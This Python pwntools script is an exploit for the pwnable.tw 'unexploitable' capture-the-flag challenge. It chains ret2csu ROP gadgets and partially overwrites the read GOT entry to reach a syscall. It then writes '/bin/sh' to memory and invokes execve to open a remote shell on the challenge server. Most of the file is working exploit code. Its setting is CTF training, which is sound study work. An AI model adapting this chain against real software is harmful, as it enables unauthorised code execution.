#!/usr/bin/python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chall.pwnable.tw' '--port=10403' ./unexploitable
from pwn import *
from time import sleep
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./unexploitable')
context.terminal = ['kitty', '-e', 'sh', '-c']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10403)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+45
b *0x4005d9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

SH = 0x601840

padding = "A" * 24
bss = 0x601840
libc_csu_init_start = 0x4005e6
mov_and_call = 0x4005d0
pop_rbp_ret = 0x0000000000400512
pop_rbx_rbp_ret = 0x0000000000400511
call_r12_add_rbx_mul_8 = 0x00000000004005d9 
call_rsp_add_rbx_mul_8 = 0x00000000004005da 
mov_edi_r13_call_r12_rbx_8 = 0x00000000004005d6
mov_edx_edi_mov_rsi_r14_mov_edi_r13_call_r12rbx8 = 0x00000000004005d1
mov_rdx_r15_rsi_r14_edi_r13_call_r12rbx8 = 0x00000000004005d0
add_rsp_38_ret = 0x0000000000400604
add_edi_rbx_ret_f = 0x0000000000400293
mov_edi_rsp_30_add_rsp_38_ret = 0x0000000000400600
leave_ret = 0x0000000000400576
test_lmao = 0x601fc0
_fini = exe.sym['_DYNAMIC'] + 40
def ret2csu(call_what=0xdeadbeef, rdi=0x41414141, rsi=0x42424242, rdx=0x43434343, ret2what=exe.sym['main']):
	rop = flat([
		libc_csu_init_start,
		"JUNKJUNK",
		0x0,							#rbx
		0x1,							#rbp
		call_what,						#r12	
		rdi,							#r13
		rsi,							#r14
		rdx,							#r15
		mov_and_call,					#rsp	
		0x0,
		0x0,
		0x0,
		exe.got['read'],
		SH,
		0x0,
		0x0,
		ret2what
	])
	return rop

rop = flat([

	padding,
	ret2csu(exe.got['read'], 0x0, bss, 1337)

])
pointer_to_fini = 0x601848
io.send(rop) #	to write /bin/sh\x00 to bss also address of _fini to use the bss address as a pointer later
sleep(3)
io.send("/bin/sh\x00" + p64(0x400658))
rop = flat([

	padding,
	ret2csu(exe.got['read'], 0x0, 0x601000, 0x1337)

])
sleep(3)
io.sendline(rop)	# overwrite last byte of read got to point to syscall
sleep(3)

#3d:01e8│   0x7ff394d54868 (fork+216) ◂— syscall
io.send("\x7e")
sleep(3)

rop = flat([
	padding,
	ret2csu(pointer_to_fini, SH, 0x6013c0, 0x1337)
])
io.send(rop)	# setting up contraints for execve
sleep(3)
io.send("A"*24 + p64(mov_rdx_r15_rsi_r14_edi_r13_call_r12rbx8) + "A"*27)	# set up args can call execve set rax by sending 0x3b len of payload
sleep(3)
io.interactive()

"""
[0x601010] sleep@GLIBC_2.2.5 -> 0x7fc8cf0b4680 (sleep) ◂— push   rbp
0x00007fc8cf0098a4 : syscall
"""